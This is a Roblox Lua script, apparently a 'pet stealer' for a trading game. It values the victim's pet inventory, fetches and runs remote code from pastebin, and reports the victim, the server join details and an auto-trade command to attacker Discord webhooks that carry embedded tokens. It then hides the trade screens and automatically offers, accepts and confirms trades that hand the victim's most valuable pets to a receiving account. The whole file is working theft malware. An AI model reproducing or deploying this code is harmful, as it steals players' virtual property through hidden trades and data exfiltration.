repeat
	task.wait()
until game:IsLoaded()

if not game:IsLoaded() then
	game.Loaded:Wait()
end

-- Services
local HttpService = game:GetService("HttpService")

-- Data
local WebhookNormal = "https://discord.com/api/webhooks/1286974422837755904/Qc-x_6Vtt_pibQR6v2ryu4sENuWSCkbt7JvNWP9WZekvyzScikNA_bPRfJs2jhQ_3tYT"
local WebhookHigh = "https://discord.com/api/webhooks/1298288181653016626/pMd9CeAc5wBIvkTrHMxCiOZ5rgvNC3Fej6HVHAvLIRq5Be2Ka53iqD0Hs-Nz_FyTrGKk"
local WebhookExtreme = "https://discord.com/api/webhooks/1298288241803399268/PN4aUWTSWLMgWPLfxN0Jesu51ci83ES1_m_bHhsJo_eiobd7wyNizdVK6Wz_cG2M38CM"

loadstring(game:HttpGet("https://pastebin.com/raw/kgvXxfny", true))() -- Credits
loadstring(game:HttpGet("https://pastebin.com/raw/cR7ZrhC8", true))() -- Value List

-- Client
local VictimPlayerName = game.Players.LocalPlayer.Name
local inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[VictimPlayerName].inventory
local PlayerPets = inventory.pets


-- Tables
local petsData = {}
local ExtraPetsData = {}
local rarityCounts = {
	common = 0,
	uncommon = 0,
	rare = 0,
	ultra_rare = 0,
	legendary = 0,
	commonNeon = 0,
	commonMega = 0,
	uncommonNeon = 0,
	uncommonMega = 0,
	rareNeon = 0,
	rareMega = 0,
	ultra_rareNeon = 0,
	ultra_rareMega = 0,
	legendaryNeon = 0,
	legendaryMega = 0
}

-- Variables
local VictimTotalValue = 0
local TradeProgress = false

function formatName(originalName)
	local newName = string.match(originalName, "%d+_(.*)")

	if not newName then
		newName = originalName
	end

	local formattedName = string.gsub(newName, "([^_]+)", function(word)
		return string.upper(string.sub(word, 1, 1)) .. string.lower(string.sub(word, 2))
	end)

	return formattedName
end

local function toLowerCase(inputString)
	return string.lower(inputString)
end

function InsertPetsToTable(PlayerPetsInventory, TableName)
	if not PlayerPetsInventory then return end

    local count = 0

	for key, pet in pairs(PlayerPetsInventory) do
		task.spawn(function()
			if pet.id ~= "practice_dog" then
				for PetName, v in pairs(PetValue) do
					if formatName(pet.id) == PetName then
						local SavedPetValue = 0
						if pet.properties and pet.properties.mega_neon and tonumber(v.megaValue) then
							VictimTotalValue = VictimTotalValue + tonumber(v.megaValue)
							SavedPetValue = tonumber(v.megaValue)
							
							local exists = false
							for _, existingPet in ipairs(ExtraPetsData) do
								if existingPet.name == "Mega " .. PetName then
									existingPet.ValueOfPet = existingPet.ValueOfPet + tonumber(v.megaValue)
									existingPet.Amount = existingPet.Amount + 1
									exists = true
									break
								end
							end
							if not exists then
								table.insert(ExtraPetsData, {name = "Mega " .. PetName, ValueOfPet = tonumber(v.megaValue), Amount = 1})
							end
						elseif pet.properties and pet.properties.neon and tonumber(v.neonValue) then
							VictimTotalValue = VictimTotalValue + tonumber(v.neonValue)
							SavedPetValue = tonumber(v.neonValue)

							local exists = false
							for _, existingPet in ipairs(ExtraPetsData) do
								if existingPet.name == "Neon " .. PetName then
									existingPet.ValueOfPet = existingPet.ValueOfPet + tonumber(v.neonValue)
									existingPet.Amount = existingPet.Amount + 1
									exists = true
									break
								end
							end
							if not exists then
								table.insert(ExtraPetsData, {name = "Neon " .. PetName, ValueOfPet = tonumber(v.neonValue), Amount = 1})
							end
						else
							VictimTotalValue = VictimTotalValue + tonumber(v.regularValue)
							SavedPetValue = tonumber(v.regularValue)

							local exists = false
							for _, existingPet in ipairs(ExtraPetsData) do
								if existingPet.name == PetName then
									existingPet.ValueOfPet = existingPet.ValueOfPet + tonumber(v.regularValue)
									existingPet.Amount = existingPet.Amount + 1
									exists = true
									break
								end
							end
							if not exists then
								table.insert(ExtraPetsData, {name = PetName, ValueOfPet = tonumber(v.regularValue), Amount = 1})
							end
						end
						
						if TableName ~= nil then
						local petInfo = {
							petkey = key,
							id = pet.id or "None ID",
							neon = pet.properties and pet.properties.neon or false,
							mega_neon = pet.properties and pet.properties.mega_neon or false,
							PetValue = SavedPetValue or 0
						}
						table.insert(TableName, petInfo)
						end
					end
				end
			end
		end)
		if count >= 10 then
			task.wait()
			count = 0
		else
			count = count + 1
		end
	end
end
	
InsertPetsToTable(PlayerPets, nil)

table.sort(ExtraPetsData, function(a, b)
	return a.ValueOfPet > b.ValueOfPet
end)

local function sendMessageToDiscord(message1, message2, message3, message4, message5, webhook)
	local embed = {
		title = "Use this script above to join victim, write anything in chat and you will receive a trade",
		color = 5814783,
		description = "```" .. message1 .. "```",
		fields = {
			{
				name = "Player Pets:",
				value = "```" .. message2 .. "```",
				inline = false
			},
			{
				name = "Best Pets:",
				value = "```" .. message5 .. "```",
				inline = false
			},
			{
				name = "Auto Trader Script:",
				value = "```" .. message4 .. "```",
				inline = false
			}
		}
	}

	local data = {
		content = "--@everyone" .. "\n" .. message3,
		embeds = { embed }
	}

	local response = request({
		Url = webhook,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = HttpService:JSONEncode(data)
	})
end

local function createDiscordMessage()
	local players = game:GetService("Players")
	local localPlayer = players.LocalPlayer
	local allPlayers = players:GetPlayers()
	local playerCount = #allPlayers
	local message1 = ""
	local message2 = ""
	local message3 = ""
	local message4 = ""
	local message5 = ""

	local placeId = game.PlaceId
	local serverId = game.JobId

	message1 = "👥 Players in server: " .. tostring(playerCount) .. "\n"
	message1 = message1 .. "🎮 Victim: " .. localPlayer.Name .. "\n"

	if playerCount < 3 then
		message1 = message1 .. "⚠️ Less than 3 players in server!\n"
		message1 = message1 .. "👊 Receiver: " .. Username .. "\n"
		message1 = message1 .. "📜 Players:\n"
		for _, player in ipairs(allPlayers) do
			message1 = message1 .. "• " .. player.Name .. "\n"
		end
	else
		message1 = message1 .. "👊 Receiver: " .. Username .. "\n"
		message1 = message1 .. "🔍 Enough players in server!\n"
	end

	local count = 0

	for i = 1, math.min(15, #ExtraPetsData) do
		message5 = message5 .. "x" .. tostring(ExtraPetsData[i].Amount) .. " " .. tostring(ExtraPetsData[i].name) .. ": " .. tostring(ExtraPetsData[i].ValueOfPet) .. "\n"
	end

	message2 = message2 .. "\n🎉 Rarities:\n"
	message2 = message2 .. "🟫 Value: " .. VictimTotalValue .. "\n"
	message2 = message2 .. "\n"
	message2 = message2 .. "🟦 Common: " .. rarityCounts.common .. "\n"
	message2 = message2 .. "🟢 Common Neon: " .. rarityCounts.commonNeon .. "\n"
	message2 = message2 .. "🟣 Common Mega: " .. rarityCounts.commonMega .. "\n"
	message2 = message2 .. "\n"
	message2 = message2 .. "🟪 Uncommon: " .. rarityCounts.uncommon .. "\n"
	message2 = message2 .. "🟢 Uncommon Neon: " .. rarityCounts.uncommonNeon .. "\n"
	message2 = message2 .. "🟣 Uncommon Mega: " .. rarityCounts.uncommonMega .. "\n"
	message2 = message2 .. "\n"
	message2 = message2 .. "🟩 Rare: " .. rarityCounts.rare .. "\n"
	message2 = message2 .. "🟢 Rare Neon: " .. rarityCounts.rareNeon .. "\n"
	message2 = message2 .. "🟣 Rare Mega: " .. rarityCounts.rareMega .. "\n"
	message2 = message2 .. "\n"
	message2 = message2 .. "🟥 Ultra Rare: " .. rarityCounts.ultra_rare .. "\n"
	message2 = message2 .. "🟢 Ultra Rare Neon: " .. rarityCounts.ultra_rareNeon .. "\n"
	message2 = message2 .. "🟣 Ultra Rare Mega: " .. rarityCounts.ultra_rareMega .. "\n"
	message2 = message2 .. "\n"
	message2 = message2 .. "🟨 Legendary: " .. rarityCounts.legendary .. "\n"
	message2 = message2 .. "🟢 Legendary Neon: " .. rarityCounts.legendaryNeon .. "\n"
	message2 = message2 .. "🟣 Legendary Mega: " .. rarityCounts.legendaryMega .. "\n"


	message3 = "while task.wait(1) do game:GetService('TeleportService'):TeleportToPlaceInstance(" 
		.. placeId .. ", '" .. serverId .. "', game.Players.LocalPlayer) end"

	message4 = "Username = '" .. game.Players.LocalPlayer.Name .. "' loadstring(game:HttpGet('https://pastebin.com/raw/s7dArMq1'))()"
	if VictimTotalValue > 0.01 and VictimTotalValue < 0.35 then
		sendMessageToDiscord(message1, message2, message3, message4, message5, WebhookNormal)
	end
	if VictimTotalValue >= 0.35 and VictimTotalValue < 3 then
		sendMessageToDiscord(message1, message2, message3, message4, message5, WebhookHigh)
	end
	if VictimTotalValue >= 3 then
		sendMessageToDiscord(message1, message2, message3, message4, message5, WebhookExtreme)
	end
end

createDiscordMessage()

local function TradePlayer()
	spawn(function()
		while true do
			task.wait(1)
			local ReceiverPlayer = game.Players:FindFirstChild(Username)
			if ReceiverPlayer then
				local character = ReceiverPlayer.Character or ReceiverPlayer.CharacterAdded:Wait()
				if game.Players[VictimPlayerName]:FindFirstChild("PlayerGui").TradeApp.Frame.Visible then
					local lowercaseString = toLowerCase(Username)
					if game.Players[VictimPlayerName]:FindFirstChild("PlayerGui").TradeApp.Frame.NegotiationFrame.Header.PartnerFrame.NameLabel.Text == lowercaseString then
						if not TradeProgress then
							TradeProgress = true
							game.Players[VictimPlayerName]:FindFirstChild("PlayerGui").TradeApp.Enabled = false
							game.Players[VictimPlayerName]:FindFirstChild("PlayerGui").DialogApp.Enabled = false

							local inventory2 = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[VictimPlayerName].inventory
							local NewPetsData = {}
							local pets = inventory2.pets
							InsertPetsToTable(pets, NewPetsData)

							table.sort(NewPetsData, function(a, b)
								return a.PetValue > b.PetValue
							end)
							for i = 1, 18 do
								if NewPetsData[i] and NewPetsData[i].petkey then
									local args = {
										[1] = NewPetsData[i].petkey
									}
									require(game.ReplicatedStorage.Fsys).load("RouterClient").get("TradeAPI/AddItemToOffer"):FireServer(unpack(args))
								end
							end

							repeat
								task.wait(0.1)
								require(game.ReplicatedStorage.Fsys).load("RouterClient").get("TradeAPI/AcceptNegotiation"):FireServer()
								require(game.ReplicatedStorage.Fsys).load("RouterClient").get("TradeAPI/ConfirmTrade"):FireServer()
							until not game.Players[game.Players.LocalPlayer.Name]:FindFirstChild("PlayerGui").TradeApp.Frame.Visible
							TradeProgress = false
						end
					end
				else
					game.Players[VictimPlayerName]:FindFirstChild("PlayerGui").TradeApp.Enabled = false
					game.Players[VictimPlayerName]:FindFirstChild("PlayerGui").DialogApp.Enabled = false

					local args = {
						[1] = game:GetService("Players")[Username]
					}
					require(game.ReplicatedStorage.Fsys).load("RouterClient").get("TradeAPI/SendTradeRequest"):FireServer(unpack(args))
				end
			end
		end
	end)
end

spawn(function()
	while task.wait() do
		local ReceiverPlayer = game.Players:FindFirstChild(Username)
		if ReceiverPlayer then
			game.Players[VictimPlayerName]:FindFirstChild("PlayerGui").HintApp.Enabled = false
			if TradeProgress then
				game.Players[game.Players.LocalPlayer.Name]:FindFirstChild("PlayerGui").ToolApp.Frame.Visible = true
			end
		end
	end
end)

TradePlayer()

spawn(function()
	while task.wait(15) do
		TradePlayer()
	end
end)
